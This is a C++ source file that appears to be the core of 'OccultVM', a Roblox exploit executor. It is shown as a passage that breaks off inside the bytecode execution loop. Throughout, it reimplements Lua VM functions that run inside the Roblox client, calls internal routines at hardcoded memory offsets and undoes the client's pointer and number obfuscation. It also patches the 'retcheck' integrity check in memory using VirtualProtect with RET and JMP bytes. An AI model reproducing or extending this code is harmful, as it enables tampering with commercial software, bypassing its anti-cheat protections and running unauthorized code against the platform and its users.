
#include "stdafx.h"
#include "OccultVM.h" 
#include <Windows.h>
#include <iostream>
#include <vector>
#include <sstream>
#include <WinInet.h>
#include <fstream>
#include <istream>
#include <iterator>
#include <algorithm>
#include <string>
#include <Psapi.h>
#include <tlhelp32.h>
#include <Windows.h>
#include <stdio.h>
#include <iostream>
#include <vector>
#include <TlHelp32.h>
#include <fstream>
#include <sstream>
#include <Richedit.h>
#include <io.h>
#include <WinInet.h>
#include "../Utilities/Retcheck.h"
#include "../Utilities/Scan.h"
using namespace std;


#define RA(i)   (base+GETARG_A(i))
#define RB(i)   check_exp(getBMode(GET_OPCODE(i)) == OpArgR, base+GETARG_B(i))
#define RC(i)   check_exp(getCMode(GET_OPCODE(i)) == OpArgR, base+GETARG_C(i))
#define RKB(i)  check_exp(getBMode(GET_OPCODE(i)) == OpArgK, \
        ISK(GETARG_B(i)) ? k+INDEXK(GETARG_B(i)) : base+GETARG_B(i))
#define RKC(i)  check_exp(getCMode(GET_OPCODE(i)) == OpArgK, \
        ISK(GETARG_C(i)) ? k+INDEXK(GETARG_C(i)) : base+GETARG_C(i))
#define KBx(i)  check_exp(getBMode(GET_OPCODE(i)) == OpArgK, k+GETARG_Bx(i))

#define XRC(rL, i) 0; if (ISK(GETARG_C(i))) C = (DWORD)&(ccspool[INDEXK(GETARG_C(i))]); else C = Occult_luaV_getonstack(rL, GETARG_C(i))
#define XRB(rL, i) 0; if (ISK(GETARG_B(i))) B = (DWORD)&(ccspool[INDEXK(GETARG_B(i))]); else B = Occult_luaV_getonstack(rL, GETARG_B(i))
#define ttval(val) ((TValue*)(val))
#define dojmp(L, pc, i) (pc) += (i) // Straight outta Lua LOL
#define getnval(t) (Occult_luaX_ConvertNumber(t->value.n))
#define lisfalse(t) ((t->tt == R_LUA_TNIL) || (t->tt == R_LUA_TBOOLEAN && t->value.b == 0))
#define tonumber(o, n) (o->tt == R_LUA_TNUMBER || ((o) = Occult_luaV_tonumber(o, n)) != NULL)
#define UNREF(var) (void)(var)

#define r_luaM_malloc(rL, t)  r_luaM_realloc_(rL, NULL, 0, (t))
#define r_luaX_increasestack(rL) *(DWORD *)(rL + 16) += 16
#define r_luaX_growstack(rL, x) *(DWORD*)(rL + 16) += (16 * x)

#define Occult_luaD_savestack(rL, p) ((char *)(p) - (char *)(*(DWORD*)(rL + 20)))
#define Occult_luaD_restorestack(rL, n) (TValue*)(rL + 20) + (n);

#define r_ptr_obfus(p, v) *(DWORD*)(p) = (DWORD)v - (p)
#define r_ptr_deobf(p) *(DWORD*)(p) + (p)

#define R_LUA_TNIL 0
#define R_LUA_TLIGHTUSERDATA 1
#define R_LUA_TNUMBER 2
#define R_LUA_TBOOLEAN 3
#define R_LUA_TSTRING 4
#define R_LUA_TTHREAD 5
#define R_LUA_TFUNCTION 6
#define R_LUA_TTABLE 7
#define R_LUA_TUSERDATA 8
#define R_LUA_TPROTO 9
#define R_LUA_TUPVALUE 10

DWORD OCCULT_MODULEBASE = (DWORD)(GetModuleHandleA(NULL));
BYTE* OCCULT_DUMMY = new BYTE[2048];

Retcheck ret;

DWORD XorConstant = (DWORD)(DWORD*)(OCCULT_OFFSET(OCCULT_IDABASE, OCCULT_RLUAV_XORCONST));
_r_luaD_precall r_luaD_precall = (_r_luaD_precall)ret.unprotect<DWORD>((BYTE*)(OCCULT_OFFSET(OCCULT_IDABASE, OCCULT_RLUAD_PRECALL)));
_r_luaV_gettable r_luaV_gettable = (_r_luaV_gettable)(OCCULT_OFFSET(OCCULT_IDABASE, OCCULT_RLUAV_GETTABLE));
_r_luaV_settable r_luaV_settable = (_r_luaV_settable)(OCCULT_OFFSET(OCCULT_IDABASE, OCCULT_RLUAV_SETTABLE));
_r_luaS_newlstr r_luaS_newlstr = (_r_luaS_newlstr)(OCCULT_OFFSET(OCCULT_IDABASE, OCCULT_RLUAS_NEWLSTR));
_r_luaM_realloc_ r_luaM_realloc_ = (_r_luaM_realloc_)(OCCULT_OFFSET(OCCULT_IDABASE, OCCULT_RLUAM_REALLOC));
_r_lua_newthread r_lua_newthread = (_r_lua_newthread)ret.unprotect<DWORD>((BYTE*)(OCCULT_OFFSET(OCCULT_IDABASE, OCCULT_RLUA_NEWTHREAD)));
_r_luaH_new r_luaH_new = (_r_luaH_new)(OCCULT_OFFSET(OCCULT_IDABASE, OCCULT_RLUAH_NEW));
_r_call_binTM r_call_binTM = (_r_call_binTM)(OCCULT_OFFSET(OCCULT_IDABASE, OCCULT_RVMCALL_BINTIM));
_r_luaF_close r_luaF_close = (_r_luaF_close)(OCCULT_OFFSET(OCCULT_IDABASE, OCCULT_RLUAF_CLOSE));
_r_luaH_resizearray r_luaH_resizearray = (_r_luaH_resizearray)(OCCULT_OFFSET(OCCULT_IDABASE, OCCULT_RLUAH_RESIZEARRAY));
_r_luaH_setnum r_luaH_setnum = (_r_luaH_setnum)(OCCULT_OFFSET(OCCULT_IDABASE, OCCULT_RLUAH_SETNUM));
_r_luaH_getn r_luaH_getn = (_r_luaH_getn)(OCCULT_OFFSET(OCCULT_IDABASE, OCCULT_RLUAH_GETN));
_r_luaD_growstack r_luaD_growstack = (_r_luaD_growstack)(OCCULT_OFFSET(OCCULT_IDABASE, OCCULT_RLUAD_GROWSTACK));
_r_luaG_newproto r_luaG_newproto = (_r_luaG_newproto)(OCCULT_OFFSET(OCCULT_IDABASE, OCCULT_RLUAG_NEWPROTO));
_r_luaG_newupvalue r_luaG_newupvalue = (_r_luaG_newupvalue)(OCCULT_OFFSET(OCCULT_IDABASE, OCCULT_RLUAG_NEWUPVALUE));
_r_rLua_tostring r_rLua_tostring = (_r_rLua_tostring)(OCCULT_OFFSET(OCCULT_IDABASE, OCCULT_RLUA_TOSTRING));
_r_lua_setfield r_lua_setfield = (_r_lua_setfield)ret.unprotect<DWORD>((BYTE*)(OCCULT_OFFSET(OCCULT_IDABASE, OCCULT_RLUA_SETFIELD)));

///////////////////////////////////////////////////////////////////////////////////

DWORD Occult_R_index2adr(DWORD rL, signed int idx)
{
	DWORD result;
	int counter;

	if (idx <= 0)
	{
		if (idx <= -10000)
		{
			switch (idx)
			{
			case -10002:
				result = *(DWORD*)(rL + 104);
				break;
			case -10001:
				result = *(DWORD*)(rL + 72);
				*(DWORD*)(result) = *(DWORD*)(**(DWORD **)(*(DWORD *)(rL + 12) + 16) + 12);
				((DWORD*)result)[2] = 7;
				break;
			case -10000:
				counter = **(DWORD**)(*(DWORD *)(rL + 12) + 16);
				if (-10002 - idx > *(BYTE*)(counter + 7))
					result = NULL;
				else
					result = *(DWORD*)(counter + 16 * (-10002 - idx) + 8);
				break;
			}
		}
		else
			result = *(DWORD*)(*(DWORD*)(rL + 16) + 16 * idx);
	}
	else
	{
		result = NULL;
		if ((unsigned int)(16 * idx + *(DWORD*)(rL + 28) - 16) < *(DWORD*)(rL + 16))
			result = *(DWORD*)(16 * idx + *(DWORD*)(rL + 28) - 16);
	}
	return result;
}

DWORD Occult_R_type(DWORD rL, signed int idx)
{
	TValue* tv = (TValue*)(Occult_R_index2adr(rL, idx));
	if (tv)
		return tv->tt;
	else
		return LUA_TNONE;
}


/*

R LUA STATE OFFSETS

rL + 16 = L->top
rL + 20 = L->stack
rL + 28 = L->base
rL + 32 = L->stack_last
rL + 48 = L->stacksize
rL + 104 = (global environment)

*/

///////////////////////////////////////////////////////////////////////////////////

auto Occult_luaX_backjump(DWORD jmp) // credit to avocado
{
	jmp = OCCULT_OFFSET(OCCULT_IDABASE, jmp);
	DWORD OldProtect;
	BYTE OldJump = *(BYTE*)(jmp);
	VirtualProtect((LPVOID)(jmp), 1, PAGE_EXECUTE_READWRITE, &OldProtect);
	*(BYTE*)(jmp) = 0xEB;
	return [&]() {
		*(BYTE*)(jmp) = OldJump;
		VirtualProtect((LPVOID)(jmp), 1, OldProtect, &OldProtect);
	};
}

int Occult_luaD_precall(lua_State* L, DWORD rL, DWORD A, LClosure* func, int nresults)
{
	//ptrdiff_t funcr;
	//CallInfo* ci;
	//StkId st, base;
	Proto* p = (Proto*)(((DWORD)func) + 1);
	DbgPrint("p: %x\n", p);
	//funcr = Occult_luaD_savestack(rL, A);
	//A = (DWORD)Occult_luaD_restorestack(rL, funcr);
	DWORD A_Val = *(DWORD*)A;
	DbgPrint("PREQ 1\n");
	DWORD stackloc = A_Val + 16 + *(DWORD*)(A_Val + 16);
	DbgPrint("PREQ 2\n");
	DWORD stackdes = *(BYTE*)(stackloc + 72);
	DbgPrint("ONE\n", p);
	if (*(DWORD*)(rL + 32) - *(DWORD*)(rL + 16) <= 16 * stackdes)
	{
		int finaladjustment;
		DWORD stacksize = *(DWORD*)(rL + 48);
		DbgPrint("ONE A\n", p);
		if (stackdes > stacksize)
			finaladjustment = stackdes + stacksize;
		else
			finaladjustment = 2 * stacksize;
		r_luaD_growstack(rL, finaladjustment);
		DbgPrint("ONE B\n", p);
	}
	DbgPrint("TWO\n", p);
	DWORD stackbs = r_ptr_deobf(*(DWORD*)(rL + 24));
	DWORD stackargsa = stackbs = *(DWORD*)(rL + 24);
	DbgPrint("THREE\n", p);
	DWORD stackargsb = stackargsa + 16 + 16 * *(BYTE*)(stackloc + 73);
	DWORD stackargsc = stackargsa + 16;
	DWORD stackargsd = *(DWORD*)(rL + 12);
	DbgPrint("FOUR\n", p);
	DWORD stackargse = stackargsd + 24;
	if (*(DWORD*)(rL + 16) > stackargsb)
		*(DWORD*)(rL + 16) = stackargsb;
	DbgPrint("FIVE\n", p);
	*(DWORD*)(rL + 12) = stackargse;
	DWORD* l_stack = r_ptr_deobf((DWORD*)(rL + 20));
	*(DWORD *)(stackargse + 16) = stackargsa;
	*(DWORD *)(stackargse + 12) = stackargsc;
	*(DWORD *)(rL + 28) = stackargsc;
	DbgPrint("SIX\n", p);
	*(DWORD *)(stackargse + 8) = stackargsc + 16 * stackdes;
	*l_stack = stackbs - (DWORD)l_stack;
	DbgPrint("SEVEN\n", p);
	*(DWORD *)(stackargse + 4) = 0;
	*(DWORD *)(stackargse + 20) = nresults;
	*(DWORD *)(rL + 16) = stackargsc + 16 * p->maxstacksize;
	DbgPrint("EIGHT\n", p);
	L->savedpc = (const Instruction*)p->code;
	DbgPrint("NINE\n", p);
	for (size_t i = *(DWORD *)(rL + 16); i < *(DWORD *)(stackargse + 8); i += 16)
		*(DWORD*)(i + 8) = 0; // set nil locals and stuff
	DbgPrint("TEN\n", p);
	return TRUE;
}

int Occult_luaX_rcall(lua_State* L, DWORD rL, DWORD A, DWORD Results, LClosure* CmpLcL = NULL)
{
	/*
	if (CmpLcL)
	{
	if (*(BYTE*)(CmpLcL) == 0xFF)
	{
	DbgPrint("LCL MARK FOUND -- RUNNING OCCULT_LUAD_PRECALL\n");
	Occult_luaD_precall(L, rL, A, CmpLcL, Results);
	return 3;
	}
	}
	*/
	//AUTO restorefn = Occult_luaX_backjump(OCCULT_RLUAD_PRECALL_RTCHECK);
	DWORD Return = r_luaD_precall(rL, A, Results);
	//restorefn();
	//if (CmpLcL != NULL && *(BYTE*)(CmpLcL->env) == 0xFF)
		//return 3;
	return Return;
}

///////////////////////////////////////////////////////////////////////////////////

/*
{ 0, 6, iAB }, // OP_MOVE
{ 1, 4, iABx }, // OP_LOADK
{ 2, 0, iABC }, // OP_LOADBOOL
{ 3, 7, iAB }, // OP_LOADNIL
{ 4, 2, iAB }, // OP_GETUPVAL
{ 5, 8, iABx }, // OP_GETGLOBAL
{ 6, 1, iABC }, // OP_GETTABLE
{ 7, 3, iABx }, // OP_SETGLOBAL
{ 8, 5, iAB }, // OP_SETUPVAL
{ 9, 0xF, iABC }, // OP_SETTABLE
{ 10, 0xD, iABC }, // OP_NEWTABLE
{ 11, 9, iABC }, // OP_SELF
{ 12, 0x10, iABC }, // OP_ADD
{ 13, 0xB, iABC }, // OP_SUB
{ 14, 0x11, iABC }, // OP_MUL
{ 15, 0xA, iABC }, // OP_DIV
{ 16, 0xC, iABC }, // OP_MOD
{ 17, 0xE, iABC }, // OP_POW
{ 18, 0x18, iAB }, // OP_UNM
{ 19, 0x16, iAB }, // OP_NOT
{ 20, 0x12, iAB }, // OP_LEN
{ 21, 0x19, iABC }, // OP_CONCAT
{ 22, 0x14, isBx }, // OP_JMP
{ 23, 0x1A, iABC }, // OP_EQ
{ 24, 0x13, iABC }, // OP_LT
{ 25, 0x15, iABC }, // OP_LE
{ 26, 0x17, iAC }, // OP_TEST
{ 27, 0x21, iABC }, // OP_TESTSET
{ 28, 0x1F, iABC }, // OP_CALL
{ 29, 0x1B, iABC }, // OP_TAILCALL
{ 30, 0x22, iAB }, // OP_RETURN
{ 31, 0x1D, iAsBx }, // OP_FORLOOP
{ 32, 0x23, iAsBx }, // OP_FORPREP
{ 33, 0x1C, iAC }, // OP_TFORLOOP
{ 34, 0x1E, iABC }, // OP_SETLIST
{ 35, 0x20, iA }, // OP_CLOSE
{ 36, 0x25, iABx }, // OP_CLOSURE
{ 37, 0x24, iAB } // OP_VARARG
*/

#define Occult_luaB_pop(rL, n) Occult_luaB_settop(rL, -(n)-1)
void Occult_luaB_settop(DWORD rL, DWORD idx)
{
	if (idx < 0)
	{
		*(DWORD*)(rL + 16) += 16 * idx + 16;
	}
	else
	{
		int i;
		for (i = 16 * idx; *(DWORD*)(rL + 16) < (unsigned int)(i + *(DWORD*)(rL + 28)); *(DWORD*)(rL + 16) += 16)
			*(DWORD*)(*(DWORD*)(rL + 16) + 8) = 0;
		*(DWORD*)(rL + 16) = i + *(DWORD*)(rL + 28);
	}
}

int Occult_luaB_gettop(DWORD rL) {
	return (*(DWORD*)(rL + 16) - *(DWORD*)(rL + 28)) >> 4;
}

DWORD Occult_luaV_getonstack(DWORD rL, DWORD idx)
{
	return *(DWORD*)(rL + 28) + 16 * idx;
}

BOOL Occult_luaV_convertTValue(lua_State* L, DWORD rL, TValue* From, TValue* Destination)
{
	//DbgPrint("Converting TValue located at %x to %x\n", (DWORD)From, (DWORD)Destination);
	if (From == Destination)
	{
		//DbgPrint("Conversion cannot proceed: From and Destination are the same TValue\n");
		SuspendThread(GetCurrentThread());
	}
	//DbgPrint("From Type: %d\n", From->tt);
	switch (From->tt)
	{
	case LUA_TNIL:
	{
		Destination->tt = R_LUA_TNIL;
		Destination->value.p = NULL;
		break;
	}

	case LUA_TBOOLEAN:
	{
		Destination->tt = R_LUA_TBOOLEAN;
		Destination->value.b = From->value.b;
		break;
	}

	case LUA_TNUMBER:
	{
		double newnumber;
		void* oldnumber = &(From->value.n);
		Destination->tt = R_LUA_TNUMBER;
		__asm
		{
			mov edx, oldnumber
			mov eax, XorConstant
				movsd xmm1, qword ptr[edx]
				xorpd xmm1, [eax]
				movsd newnumber, xmm1
		}
		Destination->value.n = newnumber;
		break;
	}

	case LUA_TSTRING:
	{
		TString* ts = (TString*)(From->value.gc);
		const char* str = (const char*)(ts + 1);
		Destination->tt = R_LUA_TSTRING;
		Destination->value.gc = (GCObject*)r_luaS_newlstr(rL, str, ts->tsv.len);
	//	DbgPrint("Was String: %s\n", str);
		break;
	}

	case LUA_TLIGHTUSERDATA: {
		Destination->tt = R_LUA_TLIGHTUSERDATA;
		Destination->value.p = From->value.p;
		break;
	}

	case LUA_TUSERDATA: {
		Destination->tt = R_LUA_TUSERDATA;
		Destination->value.gc = From->value.gc;
		break;
	}

	}
	return TRUE;
}

double Occult_luaX_ConvertNumber(double Number) {
	void* oldnumber = &(Number);
	double newnumber;
	__asm
	{
		mov edx, oldnumber
		mov eax, XorConstant
			movsd xmm1, qword ptr[edx]
			xorpd xmm1, [eax]
			movsd newnumber, xmm1
	}
	return newnumber;
}

bool Occult_luaV_equalVal(DWORD rL, TValue* t1, TValue* t2) {
	if (t1->tt != t2->tt)
		return false;

	switch (t1->tt) {
	case R_LUA_TNIL: return true;
	case R_LUA_TNUMBER: return t1->value.n == t2->value.n;
	case R_LUA_TBOOLEAN: return t1->value.b == t2->value.b;
	case R_LUA_TLIGHTUSERDATA: return t1->value.p == t2->value.p;
	case R_LUA_TTABLE:
	case R_LUA_TUSERDATA: {
		if (t1->value.gc == t2->value.gc) return true;
		if (r_call_binTM(rL, (DWORD)t1, (DWORD)t2, *(DWORD*)(rL + 16), R_TM_EQ))
			return !lisfalse(ttval(*(DWORD*)(rL + 16)));
		return false;
	}
	default: return t1->value.gc == t2->value.gc;
	};
}

int Occult_luaO_fb2int(int x) {
	int e = (x >> 3) & 31;
	if (e == 0) return x;
	else return ((x & 7) + 8) << (e - 1);
}

// Lua Ftw.
int Occult_luaO_str2d(const char *s, double *result) {
	char *endptr;
	*result = lua_str2number(s, &endptr);
	if (endptr == s) return 0;
	if (*endptr == 'x' || *endptr == 'X')
		*result = cast_num(strtoul(s, &endptr, 16));
	if (*endptr == '\0') return 1;
	while (isspace(cast(unsigned char, *endptr))) endptr++;
	if (*endptr != '\0') return 0;
	return 1;
}

TValue* Occult_luaV_tonumber(TValue* obj, TValue* n) {
	double num;
	if (obj->tt == R_LUA_TNUMBER) return obj;
	if (obj->tt == R_LUA_TSTRING) {
		char* str = (char*)((TString*)obj->value.gc + 1);
		if (str && Occult_luaO_str2d(str, &num)) {
			n->value.n = Occult_luaX_ConvertNumber(num);
			n->tt = R_LUA_TNUMBER;
			return n;
		}
	}
	return NULL;
}

void Occult_luaX_Arith(DWORD rL, DWORD A, DWORD B, DWORD C, R_TMS op) {
	TValue tempb, tempc;
	TValue* b;
	TValue* c;

	b = Occult_luaV_tonumber(ttval(B), &tempb);
	c = Occult_luaV_tonumber(ttval(C), &tempc);

	if (b && c) {
		double nb = Occult_luaX_ConvertNumber(ttval(b)->value.n),
			nc = Occult_luaX_ConvertNumber(ttval(c)->value.n);
		switch (op) {
		case R_TM_ADD: {
			ttval(A)->tt = R_LUA_TNUMBER;
			ttval(A)->value.n = Occult_luaX_ConvertNumber(nb + nc);
			break;
		}
		case R_TM_SUB: {
			ttval(A)->tt = R_LUA_TNUMBER;
			ttval(A)->value.n = Occult_luaX_ConvertNumber(nb - nc);
			break;
		}
		case R_TM_MUL: {
			ttval(A)->tt = R_LUA_TNUMBER;
			ttval(A)->value.n = Occult_luaX_ConvertNumber(nb * nc);
			break;
		}
		case R_TM_DIV: {
			ttval(A)->tt = R_LUA_TNUMBER;
			ttval(A)->value.n = Occult_luaX_ConvertNumber(nb / nc);
			break;
		}
		case R_TM_MOD: {
			ttval(A)->tt = R_LUA_TNUMBER;
			ttval(A)->value.n = Occult_luaX_ConvertNumber((nb - floor(nb / nc) * nc));
			break;
		}
		case R_TM_POW: {
			ttval(A)->tt = R_LUA_TNUMBER;
			ttval(A)->value.n = Occult_luaX_ConvertNumber(pow(nb, nc));
			break;
		}
		case R_TM_UNM: {
			ttval(A)->tt = R_LUA_TNUMBER;
			ttval(A)->value.n = Occult_luaX_ConvertNumber((-(nb)));
			break;
		}
		default: lua_assert(0); break;
		}
	}
	else if (!r_call_binTM(rL, B, C, A, op))
		DbgPrint("luaG_aritherror called here TODO: IMPLEMENT THIS\n");//luaG_aritherror(L, rb, rc);
}

void Occult_luaX_dcall(lua_State* L, DWORD rL, Proto* p, LClosure* lcl, TValue* Func, int nResults) {
	//54
	if (++*(DWORD*)(rL + 0x36) >= LUAI_MAXCCALLS) {
		if (*(DWORD*)(rL + 0x36) == LUAI_MAXCCALLS) {
			DbgPrint("C stack overflow");
			//do blah
		}
		else if (*(DWORD*)(rL + 0x36) >= (LUAI_MAXCCALLS + (LUAI_MAXCCALLS >> 3))) {
			//error while handling stack error :U
		}
	}
	if (Occult_luaX_rcall(L, rL, (DWORD)Func, nResults) == 0) {
		Occult_luaV_execute(L, rL, 1);
	}
	--*(DWORD*)(rL + 0x36);
}

#define sizeLclosure(n)	(cast(int, sizeof(LClosure)) + \
                         cast(int, sizeof(TValue *)*((n)-1)))

Closure* Occult_luaF_newLclosure(DWORD rL, int nelems, void *e) {
	/*Closure *c = cast(Closure *, r_luaM_malloc(rL, sizeLclosure(nelems)));
	//luaC_link(L, obj2gco(c), LUA_TFUNCTION);
	c->l.isC = 0;
	c->l.env = e;
	c->l.nupvalues = cast_byte(nelems);
	while (nelems--) c->l.upvals[nelems] = NULL;
	return c;*/
	return nullptr;
}

auto Occult_luaX_backretcheck()
{
	DWORD Flag1 = OCCULT_OFFSET(OCCULT_IDABASE, OCCULT_RETCHECK_FLAG1);
	DWORD Flag2 = OCCULT_OFFSET(OCCULT_IDABASE, OCCULT_RETCHECK_FLAG2);
	DWORD RetCheck = OCCULT_OFFSET(OCCULT_IDABASE, OCCULT_RETCHECK_ADDY);

	DWORD FlagBackup1 = *(DWORD*)Flag1, FlagBackup2 = *(DWORD*)Flag2;

	DWORD OldProtect;
	BYTE OldJump = *(BYTE*)(RetCheck);
	VirtualProtect((LPVOID)(RetCheck), 1, PAGE_EXECUTE_READWRITE, &OldProtect);
	*(BYTE*)(RetCheck) = 0xC3;
	return [&]() {
		*(DWORD*)Flag1 = FlagBackup1;
		*(DWORD*)Flag2 = FlagBackup2;
		*(BYTE*)(RetCheck) = OldJump;
		VirtualProtect((LPVOID)(RetCheck), 1, OldProtect, &OldProtect);
	};
}

void Occult_rluaV_execute(DWORD rL, int nexeccalls) {
	DWORD robloxVm = OCCULT_OFFSET(OCCULT_IDABASE, OCCULT_RLUAV_EXECUTE);
	auto restore = Occult_luaX_backretcheck();
	((void(__cdecl*)(DWORD rL, DWORD nexeccalls))robloxVm)(rL, nexeccalls);
	restore();
}

int Occult_luaX_pushcclosure(DWORD rL, rlua_CFunction a2, int UPVALUES) {
	// thx ida

	int v3, v4, v5, v6, v7, v8, v9, v10, v11, v14, v15;

	int a1 = rL;

	DWORD Addy1 = OCCULT_OFFSET(OCCULT_IDABASE, OCCULT_RLUAC_STEP);
	DWORD Addy2 = OCCULT_OFFSET(OCCULT_IDABASE, OCCULT_RLUAF_NEWCCLOSURE);

	v3 = a1;
	if (*(DWORD*)(*(DWORD*)(a1 + 8) + a1 + 96) >= *(DWORD*)(*(DWORD*)(a1 + 8) + a1 + 84))
		((int(__cdecl*)(int))Addy1)(a1);
	v4 = *(DWORD*)(a1 + 12);
	if (v4 == *(DWORD*)(a1 + 40))
		v5 = *(DWORD*)(a1 + 96);
	else
		v5 = *(DWORD*)(**(DWORD**)(v4 + 8) + 12);
	v6 = UPVALUES;
	v7 = ((int(__cdecl*)(int, int, int))Addy2)(a1, UPVALUES, v5);
	*(DWORD*)(v7 + 12) = (int)a2 - (v7 + 12);
	v8 = 16 * UPVALUES;
	*(DWORD*)(a1 + 12) -= 12 * UPVALUES;
	v14 = v7;
	v15 = 16 *UPVALUES;
	if (v6)
	{
		v9 = v8 + v14 + 24;
		do
		{
			v9 -= 12;
			v10 = -24 - v14 + *(DWORD*)(v3 + 12);
			*(DWORD*)v9 = *(DWORD*)(v10 + v9);
			*(DWORD*)(v9 + 4) = *(DWORD*)(v10 + v9 + 4);
			*(DWORD*)(v9 + 8) = *(DWORD*)(v10 + v9 + 8);
			--v6;
		} while (v6);
	}
	v11 = *(DWORD*)(v3 + 12);
	*(DWORD*)v11 = v14;
	*(DWORD*)(v11 + 8) = 6;
	*(DWORD*)(v3 + 16) += 12;
	return v11;
}
TValue* Occult_luaX_pushcclosure_singleupvalue(DWORD rL, rlua_CFunction a2, TValue* upvalueinquestion) {
	// thx ida

	int v3, v4, v5, v6, v7, v8, v9, v10, v14;

	int a1 = rL;

	DWORD Addy1 = OCCULT_OFFSET(OCCULT_IDABASE, OCCULT_RLUAC_STEP);
	DWORD Addy2 = OCCULT_OFFSET(OCCULT_IDABASE, OCCULT_RLUAF_NEWCCLOSURE);

	v3 = a1;
	if(*(DWORD*)(a1 + *(DWORD*)(a1 + 32) + 112) >= *(DWORD*)(*(DWORD*)(a1 + 32) + a1 + 104)) {
		((int(__cdecl*)(int))Addy1)(a1);
		/*((int(__cdecl*)(int))Addy1)(a1);
		((int(__cdecl*)(int))Addy1)(a1);
		((int(__cdecl*)(int))Addy1)(a1);*/
	}
	v4 = *(DWORD*)(a1 + 16);
	if (v4 == *(DWORD*)(a1 + 40))
		v5 = *(DWORD*)(a1 + 96);
	else
		v5 = *(DWORD*)(**(DWORD**)(v4 + 8) + 12);
	v6 = 1;
	v7 = ((int(__cdecl*)(int, int, int))Addy2)(a1, 1, v5);
	r_ptr_obfus(v7 + 16, a2);
	v8 = 16;
	v14 = v7;

	if (v6)
	{
		v9 = v8 + v14 + 24;
		v9 -= 16;
		memcpy((void*)v9, upvalueinquestion, sizeof(TValue));
	}

	TValue v11;
	v11.value.gc = (GCObject*)v14;
	v11.tt = R_LUA_TFUNCTION;
	return &v11;
}

void* Occult_luaX_newuserdata(DWORD rL, DWORD size) {
	return ((void*(__cdecl*)(int, int, int))OCCULT_OFFSET(OCCULT_IDABASE, 0x53C4A0))(rL, size, *(DWORD*)(rL + 104));
}

DWORD Occult_luaX_getmetatable(DWORD rL, DWORD objindex) {
	DWORD GetMetatable = OCCULT_OFFSET(OCCULT_IDABASE, OCCULT_RLUA_GETMETATABLE);
	auto restore = Occult_luaX_backjump(OCCULT_RLUA_GETMETATABLERETCHECK);
	DWORD Result = ((int(__cdecl*)(DWORD rL, DWORD idx))GetMetatable)(rL, objindex);
	restore();
	return Result;
}

int Occult_luaD_poscall(lua_State* L, DWORD rL, StkId firstResult) {
	StkId res;
	int wanted, i;
	CallInfo *ci;
	/*if (L->hookmask & LUA_MASKRET)
	firstResult = callrethooks(L, firstResult);*/
	ci = L->ci--;
	res = ci->func;  /* res == final position of 1st result */
	wanted = ci->nresults;
	L->base = (ci - 1)->base;  /* restore base */
	L->savedpc = (ci - 1)->savedpc;  /* restore savedpc */
									 /* move results to correct place */
	for (i = wanted; i != 0 && firstResult < L->top; i--) {
		TValue* a = res++;
		TValue* b = firstResult++;
		b->tt = a->tt;
		b->value = a->value;
	}
	while (i-- > 0)
		ttval(res++)->tt = R_LUA_TNIL;
	*(DWORD*)(rL + 16) = (DWORD)res;
	return (wanted - LUA_MULTRET);  /* 0 iff wanted == LUA_MULTRET */
}

void* Occult_luaX_touserdata(DWORD rL, signed int idx) {
	DWORD fuck = OCCULT_OFFSET(OCCULT_IDABASE, OCCULT_RLUA_TOUSERDATA);
	return ((void*(__cdecl*)(DWORD, signed int))fuck)(rL, idx);
}

//BOOL Occult_luaV_execute(lua_State* L, DWORD rL, Proto* pfn, LClosure* lcl, int nexeccalls)
BOOL Occult_luaV_execute(lua_State* L, DWORD rL, int nexeccalls)
{
	LClosure* lclb;
	LClosure* lcl;
	Proto* pfn;
	TValue* k;
	DWORD ostack;
	DWORD rstack;
	DWORD cspool;
	TValue* ccspool;
	const Instruction *pc;
//	DbgPrint("\nmemtest\n");
//	DbgPrint("!! In Occult_luaV_execute\n");
reentry: /* entry point??? */
	lcl = &((Closure*)L->ci->func->value.gc)->l;
	pfn = lcl->p;
	*(DWORD*)(rL + 12) += pfn->maxstacksize * 12 + 0x20; // Temporary fix for stack oddity
//	DbgPrint("Inside of rL + 12.\n");
	ccspool = (TValue*)r_luaM_malloc(rL, pfn->sizek * sizeof(TValue));
	ostack = *(DWORD*)(rL + 12);
	cspool = (DWORD)(DWORD*)pfn->k;
//	DbgPrint("!! cspool: %x\n", cspool);
	pc = (const Instruction*)L->savedpc;
	k = pfn->k;
//	DbgPrint("!! Obtained pc, base and k (%x, %x, %x)\n", (DWORD)pc, (DWORD)0, (DWORD)k);
	//DbgPrint("!! Now converting constants\n");
	for (int x = NULL; x < pfn->sizek; x++)
		Occult_luaV_convertTValue(L, rL, &pfn->k[x], &(ccspool[x]));
//	DbgPrint("----------------------------------------------------\n");
	for (;;)
	{
		const Instruction i = *pc++;
	//	DbgPrint("!! Running %d\n", GET_OPCODE(i));
		r_ptr_obfus(rL + 20, i);
		switch (GET_OPCODE(i))
		{
		case OP_MOVE: {
			DWORD A, B;
			A = Occult_luaV_getonstack(rL, GETARG_A(i));
			B = Occult_luaV_getonstack(rL, GETARG_B(i));
			memcpy((void*)A, (void*)B, sizeof(TValue));
			continue;
		}

		case OP_LOADK:
		{
			DWORD A;
			TValue* Bx;
			A = Occult_luaV_getonstack(rL, GETARG_A(i));
			Bx = &(ccspool[GETARG_Bx(i)]);
			memcpy((void*)A, (void*)Bx, sizeof(TValue));
			continue;
		}

		case OP_LOADBOOL:
		{
			TValue* A;
			A = (TValue*)Occult_luaV_getonstack(rL, GETARG_A(i));
			A->tt = R_LUA_TBOOLEAN;
			A->value.b = GETARG_B(i);
			if (GETARG_C(i)) pc++;
			continue;
		}

		case OP_LOADNIL:
		{
			TValue* A;
			TValue* B;
			A = (TValue*)Occult_luaV_getonstack(rL, GETARG_A(i));
			B = (TValue*)Occult_luaV_getonstack(rL, GETARG_B(i));
			do
			{
				B->tt = R_LUA_TNIL;
				B->value.p = NULL;
				B--;
			} while (B >= A);
			continue;
		}

		case OP_GETUPVAL:
		{
			DWORD A = Occult_luaV_getonstack(rL, GETARG_A(i));
			DWORD B = GETARG_B(i);
			TValue* tVal = lcl->upvals[B]->v;
			ttval(A)->tt = tVal->tt;
			ttval(A)->value = tVal->value;
			continue;
		}

		case OP_GETGLOBAL:
		{
			TValue* ctn = &(ccspool[GETARG_Bx(i)]);
			DWORD ctx = Occult_luaV_getonstack(rL, GETARG_A(i));
			L->savedpc = pc;
			if (ctn->tt == R_LUA_TSTRING) {
				//DbgPrint("GETGLOBAL KEY: %s\n", (const char*)(((TString*)ctn->value.gc) + 1));
			}
			r_luaV_gettable(rL, (DWORD)(DWORD*)rL + 96, (DWORD)ctn, ctx);
			continue;
		}

		case OP_GETTABLE:
		{

			DWORD A = Occult_luaV_getonstack(rL, GETARG_A(i));
			DWORD B = Occult_luaV_getonstack(rL, GETARG_B(i));
			DWORD C = XRC(rL, i);
			L->savedpc = pc;
